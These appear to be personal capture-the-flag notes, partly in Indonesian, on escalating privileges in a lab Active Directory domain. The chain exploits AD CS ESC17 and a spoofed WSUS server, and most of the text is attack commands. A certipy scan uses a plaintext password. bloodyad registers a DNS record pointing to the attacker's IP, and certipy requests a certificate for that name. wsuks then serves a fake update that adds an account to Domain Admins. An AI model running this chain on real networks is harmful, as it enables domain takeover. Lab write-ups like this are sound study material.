# Scan vulnerable template
```shell
# mrnggunakan credential
certipy-ad find -u 'wallace.everette@logging.htb' -p 'Welcome2026@' -dc-ip 10.129.6.2

# kalau kerberos harus ada dc-host name nya
```
![](Attachments/Pasted%20image%2020260715144013.png)
# Vulnerability ESC17
![](Attachments/Pasted%20image%2020260715144307.png)
cek website for how https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication
![](Attachments/Pasted%20image%2020260715144404.png)
## add dns record using attacker ip
```shell
bloodyad -H dc01.logging.htb -d logging.htb -u 'jaylee.clifton' -k add dnsRecord 'wsus' 10.10.15.236 
```
![](Attachments/Pasted%20image%2020260716093856.png)
## tambahkan ke /etc/hosts
![](Attachments/Pasted%20image%2020260716094107.png)
## cek nslookup
ini artinya sudah berhasil
```shell
getent hosts wsus.logging.htb

nslookup wsus.logging.htb 10.129.6.155
```
![](Attachments/Pasted%20image%2020260716094028.png)
## ESC17
```shell
certipy-ad req -u 'jaylee.clifton@logging.htb' -no-pass -k -dc-ip 10.129.245.130 -dc-host dc01.logging.htb -target 'dc01.logging.htb' -ca 'logging-DC01-CA' -template 'UpdateSrv' -dns 'wsus.logging.htb'
```
![](Attachments/Pasted%20image%2020260715151523.png)
## export to PEM
```shell
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```
![](Attachments/Pasted%20image%2020260715152449.png)
## jalankan wsuks dan tambahkan command untukk menambahkan salah satunya ke domain admin domain
```shell
sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0  -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'  
```
![](Attachments/Pasted%20image%2020260716101512.png)

## Login lagi dan cek whoami /priv
![](Attachments/Pasted%20image%2020260716101846.png)
## Successfully administrator